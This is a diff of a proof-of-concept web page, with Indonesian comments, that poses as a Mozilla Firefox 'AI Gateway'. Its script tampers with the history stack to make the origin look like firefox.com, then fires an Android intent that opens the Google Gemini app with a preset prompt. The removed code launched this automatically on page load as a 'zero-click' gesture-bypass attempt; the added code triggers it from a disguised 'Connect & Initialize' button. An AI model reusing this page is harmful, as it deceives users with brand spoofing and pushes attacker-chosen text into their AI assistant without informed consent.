@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox AI Gateway — Automated Intent Bridge</title>
+<title>Firefox AI Gateway — One-Click Bridge</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -29,6 +29,19 @@
   .logo { font-size: 24px; font-weight: 600; color: #711c91; margin-bottom: 20px; }
   h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
   p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
+  button { 
+    background: #711c91; 
+    color: #ffffff; 
+    border: none; 
+    padding: 12px 24px; 
+    font-size: 15px; 
+    font-weight: 600; 
+    border-radius: 2px; 
+    cursor: pointer; 
+    width: 100%; 
+    transition: background 0.2s;
+  }
+  button:hover { background: #5a1473; }
   #status { 
     margin-top: 20px; 
     font-size: 13px; 
@@ -41,23 +54,25 @@
 
 <div class="card">
   <div class="logo">Mozilla Firefox</div>
-  <h2>AI Engine Verification</h2>
-  <p>Initializing zero-click protocol handoff to mobile assistant runtime...</p>
-  <div id="status">[*] Loading environment...</div>
+  <h2>AI Assistant Verification</h2>
+  <p>Click below to establish a secure handshake bridge with the mobile assistant runtime.</p>
+  <button id="actionBtn">Connect & Initialize</button>
+  <div id="status"></div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
+  var btn = document.getElementById('actionBtn');
   var statusEl = document.getElementById('status');
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PoC Gemini Intent] " + msg);
+    console.log("[PoC One-Click Gemini] " + msg);
   }
 
-  function executeZeroClickGeminiIntent() {
+  function executeOneClickGeminiIntent() {
     log("[*] Stacking security context...");
 
     // 1. Manipulasi History Stack untuk menyamarkan origin (menyerupai domain firefox.com)
@@ -68,34 +83,32 @@
     } catch (e) {}
 
     // 2. Konstruksi Android Intent untuk Gemini dengan membawa teks parameter "testing"
-    // Format URI Intent spesifik untuk Google Gemini / Bard app
     var geminiPromptText = "testing";
     var geminiIntentUrl = "intent://chat?text=" + encodeURIComponent(geminiPromptText) + "#Intent;scheme=googlebard;package=com.google.android.apps.bard;action=android.intent.action.VIEW;end;";
 
-    // Alternatif Intent umum Google Assistant / Gemini action jika scheme kustom tidak aktif:
-    // var geminiIntentUrl = "intent://#Intent;action=android.intent.action.VOICE_COMMAND;end;";
+    log("[!] Dispatching intent payload via user gesture...");
 
-    log("[!] Dispatching zero-click intent payload...");
-
-    // 3. Eksekusi navigasi otomatis tanpa menunggu event klik pengguna (User Gesture Bypass attempt)
+    // 3. Eksekusi pengalihan yang diinisiasi langsung oleh gestur klik pengguna (memenuhi syarat User Activation / Transient Activation)
     setTimeout(function() {
       try {
-        // Menggunakan location.replace untuk langsung memicu intent scheme
         window.location.replace(geminiIntentUrl);
       } catch (err) {
-        log("[-] Blocked by browser gesture policy: " + err.message);
+        log("[-] Error during redirection: " + err.message);
       }
-    }, 800);
+    }, 400);
   }
 
-  // Menjalankan fungsi secara otomatis begitu dokumen siap (Zero-Click trigger)
-  if (document.readyState === 'complete' || document.readyState === 'interactive') {
-    setTimeout(executeZeroClickGeminiIntent, 500);
-  } else {
-    window.addEventListener('DOMContentLoaded', function() {
-      setTimeout(executeZeroClickGeminiIntent, 500);
-    });
-  }
+  // Menggunakan event klik murni (One-Click trigger)
+  btn.addEventListener('click', function() {
+    btn.disabled = true;
+    btn.style.opacity = "0.6";
+    log("Initializing bridge...");
+
+    setTimeout(function() {
+      executeOneClickGeminiIntent();
+    }, 500);
+
+  }, { once: true });
 
 })();
 </script>
